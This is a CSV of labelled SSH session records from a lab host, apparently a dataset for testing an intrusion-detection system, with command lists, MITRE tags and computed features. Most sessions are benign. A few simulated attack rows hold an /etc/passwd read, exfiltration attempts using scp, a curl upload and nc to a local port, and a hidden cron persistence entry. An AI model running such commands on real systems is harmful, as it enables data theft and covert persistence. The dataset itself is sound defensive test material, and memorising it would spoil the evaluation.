session_id,user,account,client_ip,target_ip,target_hostname,session_start,session_end,duration_sec,session_start_is_estimated,session_end_is_estimated,duration_sec_is_estimated,commands,event_types,raw_event_count,file_transfer_bytes,label,tactics,scenario,expected_rule_ids,mitre,source,split,persona,session_tag,composition,identity_is_synthetic,ip_is_synthetic,ts_is_synthetic,protocol,has_command_telemetry,start_time,end_time,duration_sec_feat,start_hour,off_hours_flag,is_weekend,command_count,unique_command_ratio,avg_command_length,command_entropy,flag_cred_access,flag_privesc,flag_persistence,flag_log_tamper,flag_recon,flag_exfil,new_source_ip_for_user,new_source_ip_globally,ip_foreign_to_user,distinct_source_ips_prior,distinct_source_ips_24h,source_ip_entropy
19fdc49006cfefca000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:21:27.033+0000,2026-08-07T12:21:34.594+0000,7,False,False,False,"['echo TAG:ben_auditor_bec552', ""grep 'eth0' /var/log/syslog"", ""grep 'localhost' /etc/hosts"", ""grep 'localhost' /etc/hosts"", ""grep -E '\\b[A-Z]{2,}\\b' text.txt"", ""grep 'localhost' /etc/hosts"", 'find /srv -regex "".*/config.*""', 'find /srv -regex "".*/config.*""', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",11,0,benign,[],auditor,[],[],real,eval,auditor,ben_auditor_bec552,sampled,False,False,False,SSH,1,2026-08-07 12:21:27.033000+00:00,2026-08-07 12:21:34.594000+00:00,7.0,12,0,0,7,0.5714285714285714,28.571428571428573,1.8423709931771084,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc4927e3f2d99000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:21:37.094+0000,2026-08-07T12:21:46.844+0000,9,False,False,False,"['echo TAG:ben_admin_b4e686', 'ls -l ~', 'ls -l ~', 'free -g -w', 'du -s /var /etc', 'ls -l ~', 'cd /tmp', 'ls -l ~', 'ls -l ~', 'du -a', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",13,0,benign,[],admin,[],[],real,eval,admin,ben_admin_b4e686,sampled,False,False,False,SSH,1,2026-08-07 12:21:37.094000+00:00,2026-08-07 12:21:46.844000+00:00,9.0,12,0,0,9,0.5555555555555556,8.0,1.879964948727111,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc4959cc15229000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:21:49.845+0000,2026-08-07T12:21:59.842+0000,9,False,False,False,"['df -h | sort -k 1', 'echo TAG:ben_dba_2fef66', 'find /home -perm -4000', 'find /home -perm -4000', 'du -ah --exclude=""*.tmp""', 'du -ah --exclude=""*.tmp""', 'du -shc /var', 'find /tmp -ctime 0 -type d', ""grep '^INFO' log.txt"", ""grep -n 'main' main.c"", ""grep 'function' *.js"", 'find /home -newer file.txt', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",15,0,benign,[],dba,[],[],real,eval,dba,ben_dba_2fef66,sampled,False,False,False,SSH,1,2026-08-07 12:21:49.845000+00:00,2026-08-07 12:21:59.842000+00:00,9.0,12,0,0,11,0.8181818181818182,21.272727272727273,3.095795255000934,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc498f35d60c0000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:22:03.565+0000,2026-08-07T12:22:12.592+0000,8,False,False,False,"['cd ~/projects', 'echo TAG:ben_admin_836ec7', 'cd ~/projects', 'cd /usr/local/var', ""ls -l | grep '^l'"", 'cd /var/log/clamav', 'du -d 1', 'free -l', 'cd /usr/local/var', 'free -g', 'cd /var/log/boot', 'cd /etc/skel', 'free -g', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",16,0,benign,[],admin,[],[],real,eval,admin,ben_admin_836ec7,sampled,False,False,False,SSH,1,2026-08-07 12:22:03.565000+00:00,2026-08-07 12:22:12.592000+00:00,8.0,12,0,0,12,0.75,12.583333333333334,3.084962500721156,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc49bcc7de110000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:22:15.082+0000,2026-08-07T12:22:25.342+0000,9,False,False,False,"['echo TAG:ben_admin_f09ec3', 'cd /usr/include', 'du --time', 'ls -S *.log', 'cd /var/log/syslog', 'ls -lU', 'ls / /home', 'ls -lU', 'free --version', 'du -d 1', 'cd /var/log/syslog', 'cd /usr/include', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",15,0,benign,[],admin,[],[],real,eval,admin,ben_admin_f09ec3,sampled,False,False,False,SSH,1,2026-08-07 12:22:15.082000+00:00,2026-08-07 12:22:25.342000+00:00,9.0,12,0,0,11,0.7272727272727273,11.727272727272727,2.913977073182752,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc49f16af7a40000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:22:28.593+0000,2026-08-07T12:22:36.091+0000,7,False,False,False,"['echo TAG:ben_dba_40e28a', 'find /home -size -1k', 'find /home -size -1k', 'df -h --output=source,fstype,size', 'du --max-depth=3 /tmp', 'du -B 32K', 'find /srv -name ""*.log"" -a -size +10M', 'find /opt \\( -perm 644 -o -perm 600 \\)', 'df -h --output=source,fstype,size', ""grep -E 'http[s]?://\\S+' file.txt"", 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",13,0,benign,[],dba,[],[],real,eval,dba,ben_dba_40e28a,sampled,False,False,False,SSH,1,2026-08-07 12:22:28.593000+00:00,2026-08-07 12:22:36.091000+00:00,7.0,12,0,0,9,0.7777777777777778,27.11111111111111,2.725480556997868,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc4a1b4477203000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:22:39.342+0000,2026-08-07T12:22:42.591+0000,2,False,False,False,"['echo TAG:atk_cred_access_2f8d96', 'dialog --textbox /etc/passwd 0 0', 'ls -lR', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",7,0,attack,['cred_access'],cred_access,[100510],"['T1003', 'T1552']",real,eval,,atk_cred_access_2f8d96,diluted,False,False,False,SSH,1,2026-08-07 12:22:39.342000+00:00,2026-08-07 12:22:42.591000+00:00,2.0,12,0,0,2,1.0,19.0,1.0,1,0,0,0,0,0,0,0,0,1,1,0.0
19fdc4a3572dc4f8000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:22:46.093+0000,2026-08-07T12:22:52.092+0000,5,False,False,False,"['echo TAG:ben_admin_e21edd', 'free --mebi --si', 'cd /sbin', 'cd /var/log/audit', 'du -h --max-depth=1 /opt', 'cd /sbin', 'du -h --max-depth=1 /opt', 'du -B 2E', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",11,0,benign,[],admin,[],[],real,eval,admin,ben_admin_e21edd,sampled,False,False,False,SSH,1,2026-08-07 12:22:46.093000+00:00,2026-08-07 12:22:52.092000+00:00,5.0,12,0,0,7,0.7142857142857143,15.0,2.2359263506290326,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc4a5be79d781000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:22:55.922+0000,2026-08-07T12:23:04.090+0000,7,False,False,False,"['echo TAG:ben_admin_3cb5eb', 'ls -la', 'ls -lht', 'ls -lht', 'ls -lht', 'ls -la', 'ls -1', 'du -k', 'ls -l ~/.bashrc', 'df -h --output=source,fstype,avail', 'exit']","['KBD_INPUT', 'SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",13,0,benign,[],admin,[],[],real,eval,admin,ben_admin_3cb5eb,sampled,False,False,False,SSH,1,2026-08-07 12:22:55.922000+00:00,2026-08-07 12:23:04.090000+00:00,7.0,12,0,0,9,0.6666666666666666,10.222222222222221,2.4193819456463714,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc4a89c4b6613000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:23:07.591+0000,2026-08-07T12:23:19.841+0000,11,False,False,False,"['tail -n +1 file.txt', 'echo TAG:ben_dev_9b115c', 'find /var -perm /g=w', 'awk \'$3 == ""yes"" || $3 == ""no""\' data.txt', 'find /var -perm /g=w', 'awk \'$3 == ""yes"" || $3 == ""no""\' data.txt', 'tail -n +1 file.txt', 'find /home -size 50M', ""awk '!/^#/' config.txt"", 'find . -type f | tail -n 5', 'find /data -path ""*/.bak"" -prune -o -type f -print', ""grep -i 'error' logs/*.log"", ""grep '22' /etc/services"", 'awk \'$3 == ""yes"" || $3 == ""no""\' data.txt', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",17,0,benign,[],dev,[],[],real,eval,dev,ben_dev_9b115c,sampled,False,False,False,SSH,1,2026-08-07 12:23:07.591000+00:00,2026-08-07 12:23:19.841000+00:00,11.0,12,0,0,13,0.6923076923076923,28.076923076923077,3.0269868333592873,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc4ac63248979000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:23:23.091+0000,2026-08-07T12:23:29.839+0000,6,False,False,False,"['echo TAG:ben_admin_678002', 'cd /var/log/apt/term.log', 'cd /var/log/apt/term.log', 'cd /var/mail', 'cd /var/mail', 'free -m', 'ls -S', 'du -B 512M', 'df -h --output=source,fstype,itotal,iused,iavail,ipcent,size,used,avail,pcent,target', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",12,0,benign,[],admin,[],[],real,eval,admin,ben_admin_678002,sampled,False,False,False,SSH,1,2026-08-07 12:23:23.091000+00:00,2026-08-07 12:23:29.839000+00:00,6.0,12,0,0,8,0.75,22.25,2.5,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc4aedc2671e4000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:23:33.259+0000,2026-08-07T12:23:37.839+0000,4,False,False,False,"['echo TAG:ben_admin_d05613', 'du -B 2M', 'ls /', 'ls -l ~/Downloads', 'du -B 2M', 'free -k', 'cd /var/lib', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",10,0,benign,[],admin,[],[],real,eval,admin,ben_admin_d05613,sampled,False,False,False,SSH,1,2026-08-07 12:23:33.259000+00:00,2026-08-07 12:23:37.839000+00:00,4.0,12,0,0,6,0.8333333333333334,9.166666666666666,2.2516291673878226,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc4b0c6e89223000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:23:41.089+0000,2026-08-07T12:23:50.839+0000,9,False,False,False,"['echo TAG:atk_exfil_3be2e2', ""echo 'test-data-atk_exfil_3be2e2' > /tmp/exfil_test_atk_exfil_3be2e2.txt"", 'cd /var/log/mail.err', 'scp -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 /tmp/exfil_test_atk_exfil_3be2e2.txt root@127.0.0.1:/tmp/ 2>&1 | head -5', 'df -h --output=source,fstype,itotal,iused,iavail,ipcent,size,used,avail,pcent,target', 'ls -lRhtr', 'free --tebi', 'curl -s -m 3 -X POST -F file=@/tmp/exfil_test_atk_exfil_3be2e2.txt http://127.0.0.1:9999/upload 2>&1 | head -3', 'df -h --output=source,fstype,itotal,iused,iavail,ipcent,size,used,avail,pcent,target', 'nc -w 2 127.0.0.1 9999 < /tmp/exfil_test_atk_exfil_3be2e2.txt 2>&1', 'rm -f /tmp/exfil_test_atk_exfil_3be2e2.txt', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",14,0,attack,['exfil'],exfil,[100520],"['T1048', 'T1041']",real,eval,,atk_exfil_3be2e2,diluted,False,False,False,SSH,1,2026-08-07 12:23:41.089000+00:00,2026-08-07 12:23:50.839000+00:00,9.0,12,0,0,10,0.9,63.9,3.1219280948873624,0,0,0,0,0,1,0,0,0,1,1,0.0
19fdc4b3ca924cb8000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:23:53.519+0000,2026-08-07T12:24:02.588+0000,9,False,False,False,"['echo TAG:ben_auditor_0af82b', 'ls -i', 'ls -latu', 'ls -la /etc/', ""grep -l 'hostname' *"", 'ls / /home', 'grep CRON /var/log/syslog', 'ls -latu', 'find . -maxdepth 3 -ls', ""grep '^#' script.sh"", 'ls / /home', 'find . -maxdepth 3 -ls', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",15,0,benign,[],auditor,[],[],real,eval,auditor,ben_auditor_0af82b,sampled,False,False,False,SSH,1,2026-08-07 12:23:53.519000+00:00,2026-08-07 12:24:02.588000+00:00,9.0,12,0,0,11,0.7272727272727273,14.636363636363637,2.913977073182752,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc4b6d8b72c94000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:24:05.994+0000,2026-08-07T12:24:10.338+0000,4,False,False,False,"[""cd 'My Files'"", 'echo TAG:ben_admin_69db98', 'cd /usr/local/share/man', 'cd -L mylink', 'cd /usr/share/kde4', 'cd /var/log/pm-powersave', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",9,0,benign,[],admin,[],[],real,eval,admin,ben_admin_69db98,sampled,False,False,False,SSH,1,2026-08-07 12:24:05.994000+00:00,2026-08-07 12:24:10.338000+00:00,4.0,12,0,0,5,1.0,18.0,2.321928094887362,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc4b8a5126616000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:24:13.339+0000,2026-08-07T12:24:22.838+0000,9,False,False,False,"['echo TAG:ben_auditor_f8a9f5', 'w', 'ls -lSh', 'ls -laF', 'find /home -not -name ""*.bak""', 'w', 'ls / /home', 'w', ""grep 'CRON' /var/log/syslog | grep 'CMD'"", 'find /data -size +2G -type d', 'ls -a', 'find /home -uid 1000', 'ls -lh', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",16,0,benign,[],auditor,[],[],real,eval,auditor,ben_auditor_f8a9f5,sampled,False,False,False,SSH,1,2026-08-07 12:24:13.339000+00:00,2026-08-07 12:24:22.838000+00:00,9.0,12,0,0,12,0.8333333333333334,12.916666666666666,3.188721875540867,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc4bba8e9c8f6000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:24:25.588+0000,2026-08-07T12:24:33.087+0000,7,False,False,False,"['echo TAG:ben_dev_44d001', 'python3 --version', 'find /home -size -1k', 'find /home -size -1k', ""grep -n 'main' main.c"", ""grep -n 'main' main.c"", 'find /home -type l', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",10,0,benign,[],dev,[],[],real,eval,dev,ben_dev_44d001,sampled,False,False,False,SSH,1,2026-08-07 12:24:25.588000+00:00,2026-08-07 12:24:33.087000+00:00,7.0,12,0,0,6,0.6666666666666666,19.5,1.9182958340544896,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc4f00b002ca7000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:28:00.282+0000,2026-08-07T12:28:04.329+0000,4,False,False,False,"['echo TAG:ben_auditor_0575f9', 'ls -latu', 'ls -latu', 'find /data -mmin -60', 'ls -latu', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",8,0,benign,[],auditor,[],[],real,eval,auditor,ben_auditor_0575f9,sampled,False,False,False,SSH,1,2026-08-07 12:28:00.282000+00:00,2026-08-07 12:28:04.329000+00:00,4.0,12,0,0,4,0.5,11.0,0.8112781244591328,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc4f1eb302c75000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:28:07.818+0000,2026-08-07T12:28:21.579+0000,13,False,False,False,"['echo TAG:atk_persistence_45ab58', ""echo '#!/bin/bash' > /tmp/.cache_update_atk_persistence_45ab58.sh"", ""grep -r 'password' /etc"", 'find /tmp -maxdepth 3 -type f', '(crontab -l 2>/dev/null; echo ""*/5 * * * * /tmp/.cache_update_atk_persistence_45ab58.sh"") | crontab -', 'crontab -l', ""grep -n 'main' main.c"", 'crontab -l | grep -v atk_persistence_45ab58 | crontab -', ""grep -n 'main' main.c"", 'find /tmp -maxdepth 3 -type f', 'rm -f /tmp/.cache_update_atk_persistence_45ab58.sh', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",14,0,attack,['persistence'],persistence,[100514],"['T1053', 'T1098']",real,eval,,atk_persistence_45ab58,diluted,False,False,False,SSH,1,2026-08-07 12:28:07.818000+00:00,2026-08-07 12:28:21.579000+00:00,13.0,12,0,0,10,0.8,40.4,2.9219280948873623,0,0,1,0,0,0,0,0,0,1,1,0.0
19fdc4f5ea80a77b000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:28:24.157+0000,2026-08-07T12:28:35.078+0000,10,False,False,False,"['ls -lat /etc', 'echo TAG:ben_auditor_cded18', 'find /var -not -group wheel', 'ls -lat /etc', 'find /data -regex "".*/backup_[0-9]+\\.tar\\.gz""', ""grep -r 'password' /etc"", 'ls -l ..', 'find /var -mindepth 1 -type d', 'ls -l ..', 'ls -atur', ""cat file.csv | cut -d',' -f1"", 'cat /proc/cpuinfo', ""cat file.txt | tr 'a-z' 'A-Z'"", ""grep 'config' *.conf"", 'ls -lctr', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",18,0,benign,[],auditor,[],[],real,eval,auditor,ben_auditor_cded18,sampled,False,False,False,SSH,1,2026-08-07 12:28:24.157000+00:00,2026-08-07 12:28:35.078000+00:00,10.0,12,0,0,14,0.8571428571428571,19.571428571428573,3.521640636343318,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc4f980da298b000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:28:38.990+0000,2026-08-07T12:28:44.079+0000,4,False,False,False,"['echo TAG:ben_auditor_43fc29', 'ls -l [abc]*', 'find /home -inum 123456', 'ls -l [abc]*', 'ls -R ..', 'ls -n', ""grep -oE '\\b[0-9]+(\\.[0-9]+){3}\\b' access.log"", 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",10,0,benign,[],auditor,[],[],real,eval,auditor,ben_auditor_43fc29,sampled,False,False,False,SSH,1,2026-08-07 12:28:38.990000+00:00,2026-08-07 12:28:44.079000+00:00,4.0,12,0,0,6,0.8333333333333334,17.5,2.2516291673878226,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc4fb42700fe7000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:28:46.213+0000,2026-08-07T12:28:59.327+0000,12,False,False,False,"['find . -iname ""*.jpg""', 'echo TAG:ben_dev_b2be85', ""grep -E '^[0-9]+$' numbers.txt"", 'awk \'{print NR "": "" $0}\' file.txt', 'find /var -path ""*/cache"" -prune -o -type f -print', ""grep -E '\\b[\\w.-]+@[\\w.-]+\\.[A-Za-z]{2,6}\\b' *.txt"", 'find /tmp -iregex "".*/temp.*""', ""grep '^//' main.c"", 'find /tmp -not -newer /tmp/marker', 'cd /tmp && ls -la', 'find /tmp -not -newer /tmp/marker', 'find /data -type d -a -empty', 'find /var -iregex "".*[0-9]{4}\\.txt""', ""grep -E '\\b[\\w.-]+@[\\w.-]+\\.[A-Za-z]{2,6}\\b' *.txt"", 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",17,0,benign,[],dev,[],[],real,eval,dev,ben_dev_b2be85,sampled,False,False,False,SSH,1,2026-08-07 12:28:46.213000+00:00,2026-08-07 12:28:59.327000+00:00,12.0,12,0,0,13,0.8461538461538461,32.76923076923077,3.3927474104487847,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc4ff10cea896000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:29:01.828+0000,2026-08-07T12:29:13.841+0000,11,False,False,False,"['echo TAG:ben_admin_11e400', 'cd /usr/local/lib64', 'cd /usr/local/lib64', 'cd /usr/local/lib64', 'cd /var/log/zypper.log', 'cd /usr/local/lib64', 'du --time -h', 'du -X exclude-list.txt', 'du -B 16T', 'cd /usr/local/lib64', 'ls -lSr', 'cd /var/tmp', 'cd /var/tmp', 'cd /usr/local/lib64', 'du -X exclude-list.txt', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",18,0,benign,[],admin,[],[],real,eval,admin,ben_admin_11e400,sampled,False,False,False,SSH,1,2026-08-07 12:29:01.828000+00:00,2026-08-07 12:29:13.841000+00:00,11.0,12,0,0,14,0.5,16.428571428571427,2.41379956460568,0,0,0,0,0,0,0,0,0,1,1,0.0
